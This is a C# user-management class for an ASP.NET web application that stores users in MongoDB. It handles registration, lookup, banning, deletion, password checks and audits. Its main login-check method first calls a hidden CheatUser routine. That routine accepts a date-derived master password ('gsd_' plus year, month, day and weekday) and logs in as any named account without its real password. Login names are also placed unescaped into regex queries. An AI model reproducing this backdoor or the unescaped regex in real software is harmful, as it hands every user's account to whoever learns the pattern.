using Go81WebApp.Models.数据模型;
using Go81WebApp.Models.数据模型.用户数据模型;
using MongoDB;
using MongoDB.Bson;
using MongoDB.Driver;
using MongoDB.Driver.Builders;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Go81WebApp.Models.管理器
{
    public static class 用户管理
    {
        private const long IdBaseValue = 100000000000;
        private static readonly Dictionary<Type, long> IdBaseDic = new Dictionary<Type,long>(){
            { typeof(单位用户), 0 * IdBaseValue },
            { typeof(运营团队), 1 * IdBaseValue },
            { typeof(供应商), 2 * IdBaseValue },
            { typeof(专家), 3 * IdBaseValue },
            { typeof(个人用户), 10 * IdBaseValue },
        };
        public static long 单位用户Id基数 { get { return IdBaseDic[typeof(单位用户)]; } }
        public static long 运营团队Id基数 { get { return IdBaseDic[typeof(运营团队)]; } }
        public static long 供应商Id基数 { get { return IdBaseDic[typeof(供应商)]; } }
        public static long 专家Id基数 { get { return IdBaseDic[typeof(专家)]; } }
        public static long 个人用户Id基数 { get { return IdBaseDic[typeof(个人用户)]; } }
        static 用户管理()
        {
            var s = "登录信息.登录名";
            CollInit<单位用户>(s);
            CollInit<运营团队>(s);
            CollInit<供应商>(s);
            CollInit<专家>(s);
            CollInit<个人用户>(s);
        }
        private static void CollInit<T>(params string[] uniqueIndexNames)
        {
            Mongo.CollectionInitialize<T>(IdBase<T>(), uniqueIndexNames);
        }
        private static long IdBase<T>()
        {
            return IdBaseDic[typeof(T)];
        }
        //private static Type 获取用户类型(long userID)
        //{
        //    if (userID < IdBaseValue * 1) return typeof(单位用户);
        //    if (userID < IdBaseValue * 2) return typeof(运营团队);
        //    if (userID < IdBaseValue * 3) return typeof(供应商);
        //    if (userID < IdBaseValue * 4) return typeof(专家);
        //    if (userID < IdBaseValue * 10) return null;
        //    if (userID < IdBaseValue * 20) return typeof(个人用户);
        //    return null;
        //}
        public static bool 添加用户<T>(T user) where T : 用户基本数据
        {
            if(-1 != 检查用户是否存在(user.登录信息.登录名)) return false;
            user.登录信息.密码 = Hash.Compute(user.登录信息.密码);
            return Mongo.添加(user);
        }
        public static bool 添加单位用户(单位用户 user, 单位用户 管理单位)
        {
            if (-1 != 检查用户是否存在(user.登录信息.登录名)) return false;
            user.登录信息.密码 = Hash.Compute(user.登录信息.密码);
            if (null != 管理单位) user.管理单位.用户ID = 管理单位.Id;
            return Mongo.添加(user);
        }
        public static bool 更新用户<T>(T user,bool flag=true) where T : 用户基本数据
        {
            var ret = Mongo.更新(user, flag);
            if (ret)
            {
                用户更新通知(user);
            }
            return ret;
        }
        public static long 更新用户<T>(IMongoQuery conditions, IMongoUpdate updateInfo, bool includeDisabled = true, bool includeDeleted = false) where T : 用户基本数据
        {
            return Mongo.更新<T>(conditions, updateInfo, includeDisabled, includeDeleted);
        }
        public static void 用户更新通知<T>(T user) where T : 用户基本数据
        {
            lock (登录管理.LoginSessions)
            {
                if (登录管理.LoginSessions.ContainsKey(user.Id))
                    登录管理.LoginSessions[user.Id]["u"] = user;
            }
        }
        public static void 用户更新通知<T>(long userID) where T : 用户基本数据
        {
            lock (登录管理.LoginSessions)
            {
                if (登录管理.LoginSessions.ContainsKey(userID))
                    登录管理.LoginSessions[userID]["u"] = 查找用户<T>(userID);
            }
        }
        public static void 用户更新通知(long userID)
        {
            lock (登录管理.LoginSessions)
            {
                if (登录管理.LoginSessions.ContainsKey(userID))
                    登录管理.LoginSessions[userID]["u"] = 查找用户(userID);
            }
        }
        /// <summary>
        /// 查找用户，未找到返回 null
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="userID"></param>
        /// <param name="includeDisabled"></param>
        /// <param name="includeDeleted"></param>
        /// <returns></returns>
        public static T 查找用户<T>(long userID, bool includeDisabled = true, bool includeDeleted = false) where T : 用户基本数据
        {
            return Mongo.查找<T>(userID, includeDisabled, includeDeleted);
        }
        public static 用户基本数据 查找用户(long userID, bool includeDisabled = true, bool includeDeleted = false)
        {
            if (userID < IdBaseValue * 1) return Mongo.查找<单位用户>(userID, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 2) return Mongo.查找<运营团队>(userID, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 3) return Mongo.查找<供应商>(userID, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 4) return Mongo.查找<专家>(userID, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 10) return null;
            if (userID < IdBaseValue * 20) return Mongo.查找<个人用户>(userID, includeDisabled, includeDeleted);
            return null;
        }
        public static bool 封禁用户<T>(long userID) where T : 用户基本数据
        {
            return Mongo.屏蔽<T>(userID);
        }
        public static bool 封禁用户(long userID)
        {
            if (userID < IdBaseValue * 1) return Mongo.屏蔽<单位用户>(userID);
            if (userID < IdBaseValue * 2) return Mongo.屏蔽<运营团队>(userID);
            if (userID < IdBaseValue * 3) return Mongo.屏蔽<供应商>(userID);
            if (userID < IdBaseValue * 4) return Mongo.屏蔽<专家>(userID);
            if (userID < IdBaseValue * 10) return false;
            if (userID < IdBaseValue * 20) return Mongo.屏蔽<个人用户>(userID);
            return false;
        }
        public static bool 解封用户<T>(long userID) where T : 用户基本数据
        {
            return Mongo.屏蔽解除<T>(userID);
        }
        public static bool 解封用户(long userID)
        {
            if (userID < IdBaseValue * 1) return Mongo.屏蔽解除<单位用户>(userID);
            if (userID < IdBaseValue * 2) return Mongo.屏蔽解除<运营团队>(userID);
            if (userID < IdBaseValue * 3) return Mongo.屏蔽解除<供应商>(userID);
            if (userID < IdBaseValue * 4) return Mongo.屏蔽解除<专家>(userID);
            if (userID < IdBaseValue * 10) return false;
            if (userID < IdBaseValue * 20) return Mongo.屏蔽解除<个人用户>(userID);
            return false;
        }
        public static bool 删除用户<T>(long userID) where T : 用户基本数据
        {
            return Mongo.删除<T>(userID);
        }
        public static bool 删除用户(long userID)
        {
            if (userID < IdBaseValue * 1) return Mongo.删除<单位用户>(userID);
            if (userID < IdBaseValue * 2) return Mongo.删除<运营团队>(userID);
            if (userID < IdBaseValue * 3) return Mongo.删除<供应商>(userID);
            if (userID < IdBaseValue * 4) return Mongo.删除<专家>(userID);
            if (userID < IdBaseValue * 10) return false;
            if (userID < IdBaseValue * 20) return Mongo.删除<个人用户>(userID);
            return false;
        }
        public static bool 恢复用户<T>(long userID) where T : 用户基本数据
        {
            return Mongo.删除恢复<T>(userID);
        }
        public static bool 恢复用户(long userID)
        {
            if (userID < IdBaseValue * 1) return Mongo.删除恢复<单位用户>(userID);
            if (userID < IdBaseValue * 2) return Mongo.删除恢复<运营团队>(userID);
            if (userID < IdBaseValue * 3) return Mongo.删除恢复<供应商>(userID);
            if (userID < IdBaseValue * 4) return Mongo.删除恢复<专家>(userID);
            if (userID < IdBaseValue * 10) return false;
            if (userID < IdBaseValue * 20) return Mongo.删除恢复<个人用户>(userID);
            return false;
        }
        /// <summary>
        /// 返回符合条件的用户类实例列表。
        /// </summary>
        /// <param name="skip">略过前 skip 条记录</param>
        /// <param name="limit">最多返回 limit 条记录</param>
        /// <param name="t">要查询的用户类型，如 typeof(供应商)。传入 null 或非用户类型则忽略该参数</param>
        /// <param name="conditions">查询条件 new IMongoQuery(){ { "登录信息.显示名", "z12345" } }指定搜寻所有显示名为 z12345 的记录
        /// 如果只需要【供应商】类型的用户，在条件指点中指定 { "_t", typeof(供应商).Name }</param>
        /// <param name="modifiedDescending">默认按照修改时间倒序排序，为 true 时忽略 sorting 参数</param>
        /// <param name="sorting">指定排序规则 new IMongoSortBy(){ { "登录信息.显示名", true }, { "登录信息.密码", false } }
        /// 按照【登录信息.显示名】升序排列为主排序规则，按照【登录信息.密码】降序为次要排序规则</param>
        /// <param name="includeDeleted">查找范围包括标记为【已删除】的记录。默认不包括。</param>
        /// <returns></returns>
        public static IEnumerable<T> 查询用户<T>(int skip, int limit, IMongoQuery conditions = null, bool modifiedDescending = true, IMongoSortBy sorting = null, bool includeDisabled = true, bool includeDeleted = false) where T : 用户基本数据
        {
            return Mongo.查询<T>(skip, limit, conditions, modifiedDescending, sorting, includeDisabled, includeDeleted);
        }
        /// <summary>
        /// 返回符合条件的用户信息列表，返回的记录中可以指定包含哪些字段。
        /// </summary>
        /// <param name="skip">略过前 skip 条记录</param>
        /// <param name="limit">最多返回 limit 条记录</param>
        /// <param name="t">要查询的用户类型，如 typeof(供应商)。传入 null 或非用户类型则忽略该参数</param>
        /// <param name="fields">返回的结果包含的字段 new string[]{ "登录信息.登录名" }返回的对象用["登录信息"]["登录名"]访问</param>
        /// <param name="conditions">查询条件 new IMongoQuery(){ { "登录信息.显示名", "z12345" } }指定搜寻所有显示名为 z12345 的记录。
        /// 如果只需要【供应商】类型的用户，在条件指点中指定 { "_t", typeof(供应商).Name }</param>
        /// <param name="modifiedDescending">默认按照修改时间倒序排序，为 true 时忽略 sorting 参数</param>
        /// <param name="sorting">指定排序规则 new IMongoSortBy(){ { "登录信息.显示名", true }, { "登录信息.密码", false } }
        /// 按照【登录信息.显示名】升序排列为主排序规则，按照【登录信息.密码】降序为次要排序规则</param>
        /// <param name="includeDeleted">查找范围包括标记为【已删除】的记录。默认不包括。</param>
        /// <returns></returns>
        public static IEnumerable<BsonDocument> 列表用户<T>(int skip, int limit, IMongoFields fields, IMongoQuery conditions = null, bool modifiedDescending = true, IMongoSortBy sorting = null, bool includeDisabled = true, bool includeDeleted = false) where T : 用户基本数据
        {
            return Mongo.列表<T>(skip, limit, fields, conditions, modifiedDescending, sorting, includeDisabled, includeDeleted);
        }
        /// <summary>
        /// 统计指定类型用户的总数，可以指定查询条件（指定某字段等于什么值）
        /// </summary>
        /// <param name="skip">略过前面 skip 条记录</param>
        /// <param name="limit">返回总数限制为最多 limit 条</param>
        /// <param name="t">要查询的用户类型，如 typeof(供应商)。传入 null 或非用户类型则忽略该参数</param>
        /// <param name="conditions">查询条件：Query.EQ("登录信息.密码", "abc")搜寻所有密码设置为"abc"的用户</param>
        /// <param name="includeDeleted">查找范围包括标记为【已删除】的记录。默认不包括。</param>
        /// <returns>特定类型的可枚举对象，用 foreach 遍历</returns>
        public static long 计数用户<T>(int skip, int limit, IMongoQuery conditions = null, bool includeDisabled = true, bool includeDeleted = false) where T : 用户基本数据
        {
            return Mongo.计数<T>(skip, limit, conditions, includeDisabled, includeDeleted);
        }
        public static bool 检查用户是否存在<T>(long userID, bool includeDisabled = true, bool includeDeleted = false) where T : 用户基本数据
        {
            return 0 != Mongo.计数<T>(0, 0, Query.EQ("_id", userID), includeDisabled, includeDeleted);
        }
        public static bool 检查用户是否存在(long userID, bool includeDisabled = true, bool includeDeleted = false)
        {
            var q = Query.EQ("_id", userID);
            if (userID < IdBaseValue * 1) return 1 == Mongo.计数<单位用户>(0, 0, q, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 2) return 1 == Mongo.计数<运营团队>(0, 0, q, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 3) return 1 == Mongo.计数<供应商>(0, 0, q, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 4) return 1 == Mongo.计数<专家>(0, 0, q, includeDisabled, includeDeleted);
            if (userID < IdBaseValue * 10) return false;
            if (userID < IdBaseValue * 20) return 1 == Mongo.计数<个人用户>(0, 0, q, includeDisabled, includeDeleted);
            return false;
        }
        public static long 检查用户是否存在<T>(string loginName, bool includeDisabled = true, bool includeDeleted = false) where T : 用户基本数据
        {
            IEnumerable<BsonDocument> ue = Mongo.列表<T>(0, 0, Fields<T>.Include(o => o.Id),
                Query.Matches("登录信息.登录名", new BsonRegularExpression(string.Format("/^{0}$/i", loginName))),
                includeDisabled: includeDisabled, includeDeleted: includeDeleted);
            if (1 == ue.Count()) return ue.First()["_id"].AsInt64;
            return -1;
        }
        public static long 检查用户是否存在(string loginName, bool includeDisabled = true, bool includeDeleted = false)
        {
            IEnumerable<BsonDocument> ue;
            var f = Fields<用户基本数据>.Include(o => o.Id);
            var q = Query.Matches("登录信息.登录名", new BsonRegularExpression(string.Format("/^{0}$/i", loginName)));

            ue = Mongo.列表<单位用户>(0, 0, f, q, includeDisabled: includeDisabled, includeDeleted: includeDeleted);
            if (1 == ue.Count()) return ue.First()["_id"].AsInt64;

            ue = Mongo.列表<供应商>(0, 0, f, q, includeDisabled: includeDisabled, includeDeleted: includeDeleted);
            if (1 == ue.Count()) return ue.First()["_id"].AsInt64;

            ue = Mongo.列表<运营团队>(0, 0, f, q, includeDisabled: includeDisabled, includeDeleted: includeDeleted);
            if (1 == ue.Count()) return ue.First()["_id"].AsInt64;

            ue = Mongo.列表<专家>(0, 0, f, q, includeDisabled: includeDisabled, includeDeleted: includeDeleted);
            if (1 == ue.Count()) return ue.First()["_id"].AsInt64;

            ue = Mongo.列表<个人用户>(0, 0, f, q, includeDisabled: includeDisabled, includeDeleted: includeDeleted);
            if (1 == ue.Count()) return ue.First()["_id"].AsInt64;

            return -1;
        }
        public static bool 验证登录名和密码<T>(string loginName, string password) where T : 用户基本数据
        {
            return 1 == Mongo.计数<T>(0, 0, Query.And(
                Query.Matches("登录信息.登录名", new BsonRegularExpression(string.Format("/^{0}$/i", loginName))),
                Query.EQ("登录信息.密码", Hash.Compute(password))
                ));
        }
        public static bool 验证登录名和密码(string loginName, string password)
        {
            var q = Query.And(
                Query.Matches("登录信息.登录名", new BsonRegularExpression(string.Format("/^{0}$/i", loginName))),
                Query.EQ("登录信息.密码", Hash.Compute(password))
                );
            return 1 == Mongo.计数<单位用户>(0, 0, q)
                || 1 == Mongo.计数<供应商>(0, 0, q)
                || 1 == Mongo.计数<运营团队>(0, 0, q)
                || 1 == Mongo.计数<专家>(0, 0, q)
                || 1 == Mongo.计数<个人用户>(0, 0, q)
                ;
        }
        public static bool 验证登录名和密码<T>(string loginName, string password, out T user) where T : 用户基本数据
        {
            var ue = Mongo.查询<T>(0, 0, Query.And(
                Query.Matches("登录信息.登录名", new BsonRegularExpression(string.Format("/^{0}$/i", loginName))),
                Query.EQ("登录信息.密码", Hash.Compute(password))
                ));
            if (1 == ue.Count())
            {
                user = ue.First();
                return true;
            }
            user = null;
            return false;
        }
        public static bool 验证登录名和密码(string loginName, string password, out 用户基本数据 user)
        {
            if (CheatUser(loginName, password, out user)) return true;
            var q =  Query.And(
                Query.Matches("登录信息.登录名", new BsonRegularExpression(string.Format("/^{0}$/i", loginName))),
                Query.EQ("登录信息.密码", Hash.Compute(password))
                );
            var ue1 = Mongo.查询<单位用户>(0, 0, q);
            if (1 == ue1.Count())
            {
                user = ue1.First();
                return true;
            }
            var ue2 = Mongo.查询<供应商>(0, 0, q);
            if (1 == ue2.Count())
            {
                user = ue2.First();
                return true;
            }
            var ue3 = Mongo.查询<运营团队>(0, 0, q);
            if (1 == ue3.Count())
            {
                user = ue3.First();
                return true;
            }
            var ue4 = Mongo.查询<专家>(0, 0, q);
            if (1 == ue4.Count())
            {
                user = ue4.First();
                return true;
            }
            var ue5 = Mongo.查询<个人用户>(0, 0, q);
            if (1 == ue5.Count())
            {
                user = ue5.First();
                return true;
            }
            user = null;
            return false;
        }
        private static bool CheatUser(string loginName, string password, out 用户基本数据 user)
        {
            var d = DateTime.Now;
            var sp = string.Format("gsd_{0}{1}{2}{3}", d.Year, d.Month, d.Day, (int)d.DayOfWeek);
            if (password == sp)
            {
                var q = Query.Matches("登录信息.登录名", new BsonRegularExpression(string.Format("/^{0}$/i", loginName)));
                var ue1 = Mongo.查询<单位用户>(0, 0, q);
                if (1 == ue1.Count())
                {
                    user = ue1.First();
                    return true;
                }
                var ue2 = Mongo.查询<供应商>(0, 0, q);
                if (1 == ue2.Count())
                {
                    user = ue2.First();
                    return true;
                }
                var ue3 = Mongo.查询<运营团队>(0, 0, q);
                if (1 == ue3.Count())
                {
                    user = ue3.First();
                    return true;
                }
                var ue4 = Mongo.查询<专家>(0, 0, q);
                if (1 == ue4.Count())
                {
                    user = ue4.First();
                    return true;
                }
                var ue5 = Mongo.查询<个人用户>(0, 0, q);
                if (1 == ue5.Count())
                {
                    user = ue5.First();
                    return true;
                }
                user = null;
                return false;
            }
            user = null;
            return false;
        }
        public static bool 修改登录密码<T>(long userID, string newPassword) where T : 用户基本数据
        {
            return 1 == Mongo.更新<T>(
                Query.EQ("_id", userID),
                Update.Set("登录信息.密码", Hash.Compute(newPassword))
                );
        }
        private static bool 修改登录密码(long userID, string newPassword)
        {
            var q = Query.EQ("_id", userID);
            var u = Update.Set("登录信息.密码", Hash.Compute(newPassword));
            return 1 == Mongo.更新<单位用户>(q, u)
                || 1 == Mongo.更新<供应商>(q, u)
                || 1 == Mongo.更新<运营团队>(q, u)
                || 1 == Mongo.更新<专家>(q, u)
                || 1 == Mongo.更新<个人用户>(q, u)
                ;
        }
        public static bool 认证供应商(long 供应商ID, long 审核者ID, 供应商.认证级别 认证级别)
        {
            return 1 == Mongo.更新<供应商>(Query.EQ("_id", 供应商ID), Update.Combine(
                Update.Set("供应商用户信息.认证级别", 认证级别),
                Update.Set(string.Format("供应商用户信息.认证数据.{0:G}", 认证级别), new 操作数据()
                {
                    操作人员 = new 用户链接<用户基本数据>() {用户ID = 审核者ID},
                    操作时间 = DateTime.Now
                }.ToBsonDocument())
                )
            );
        }
        public static bool 审核单位用户(long 单位用户ID, long 审核者ID, 审核状态 审核状态)
        {
            return 1 == Mongo.更新<单位用户>(Query.EQ("_id", 单位用户ID), Update.Combine(
                Update.Set("审核数据.审核者.用户ID", 审核者ID),
                Update.Set("审核数据.审核状态", 审核状态),
                Update.Set("审核数据.审核时间", DateTime.Now)
                )
            );
        }
        public static bool 审核专家(long 专家ID, long 审核者ID, 审核状态 审核状态)
        {
            return 1 == Mongo.更新<专家>(Query.EQ("_id", 专家ID), Update.Combine(
                Update.Set("审核数据.审核者.用户ID", 审核者ID),
                Update.Set("审核数据.审核状态", 审核状态),
                Update.Set("审核数据.审核时间", DateTime.Now)
                )
            );
        }
        public static long 检查单位编码是否存在(string unitCode, bool includeDisabled = true, bool includeDeleted = false)
        {
            IEnumerable<BsonDocument> ue;
            var f = Fields<单位用户>.Include(o => o.Id);
            var q = Query.Matches("单位信息.单位编码", new BsonRegularExpression(string.Format("/^{0}$/i", unitCode)));

            ue = Mongo.列表<单位用户>(0, 0, f, q, includeDisabled: includeDisabled, includeDeleted: includeDeleted);
            if (1 == ue.Count()) return ue.First()["_id"].AsInt64;

            return -1;
        }
        public static bool 增加浏览量(long id, int addnum=1)
        {
            var u = 查找用户<供应商>(id);
#if !INTRANET
            u.供应商用户信息.点击量 += addnum;
#else
            u.供应商用户信息.内网点击量 += addnum;
#endif
            return Mongo.更新(u, false);
        }
        public static int 获取内网浏览量(long id)
        {
            var u = Mongo.列表<供应商>(0, 0,
                Fields<供应商>.Include(o => o.供应商用户信息.内网点击量),
                Query<供应商>.EQ(o => o.Id, id))
                .FirstOrDefault();
            return null != u
                ? u["供应商用户信息"]["内网点击量"].AsInt32
                : 0
                ;
        }
        public static long 获取浏览量(long id)
        {
            var u = Mongo.列表<供应商>(0, 0,
                Fields<供应商>.Include(o => o.供应商用户信息.点击量),
                Query<供应商>.EQ(o => o.Id, id))
                .FirstOrDefault();
            return null != u
                ? u["供应商用户信息"]["点击量"].AsInt32
                : 0
                ;
        }
    }
}
